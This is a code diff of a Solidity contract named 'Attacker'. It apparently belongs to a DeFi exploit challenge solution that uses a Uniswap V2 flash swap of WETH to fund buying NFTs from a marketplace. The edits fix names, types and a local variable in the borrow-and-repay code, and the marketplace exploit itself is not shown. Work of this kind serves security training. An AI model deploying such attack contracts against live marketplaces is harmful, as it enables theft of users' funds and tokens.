@@ -36,7 +36,7 @@ contract Attacker is IERC721Receiver, ReentrancyGuard {
     constructor(
         address buyer_,
         address nft_,
-        address marketplace,
+        address payable marketplace,
         address factory,
         address tokenA,
         address tokenB
@@ -53,7 +53,7 @@ contract Attacker is IERC721Receiver, ReentrancyGuard {
 
     function flashSwap(uint wethAmount) external {
         // Need to pass some data to trigger uniswapV2Call
-        bytes memory data = abi.encode(WETH, msg.sender);
+        bytes memory data = abi.encode(weth, msg.sender);
 
         // amount0Out is DAI, amount1Out is WETH
         uniswapV2Pair.swap(0, wethAmount, address(this), data);
@@ -66,7 +66,7 @@ contract Attacker is IERC721Receiver, ReentrancyGuard {
         uint amount1,
         bytes calldata data
     ) external {
-        require(msg.sender == address(pair), "not pair");
+        require(msg.sender == address(uniswapV2Pair), "not pair");
         require(sender == address(this), "not sender");
 
         (address tokenBorrow, address caller) = abi.decode(
@@ -75,17 +75,17 @@ contract Attacker is IERC721Receiver, ReentrancyGuard {
         );
 
         // Your custom code would go here. For example, code to arbitrage.
-        require(tokenBorrow == WETH, "token borrow != WETH");
+        require(tokenBorrow == address(weth), "token borrow != WETH");
 
         // about 0.3% fee, +1 to round up
         uint fee = (amount1 * 3) / 997 + 1;
-        amountToRepay = amount1 + fee;
+        uint256 amountToRepay = amount1 + fee;
 
         // Transfer flash swap fee from caller
         weth.transferFrom(caller, address(this), fee);
 
         // Repay
-        weth.transfer(address(pair), amountToRepay);
+        weth.transfer(address(uniswapV2Pair), amountToRepay);
     }
 
     // Function to perform the flash swap and buy NFTs
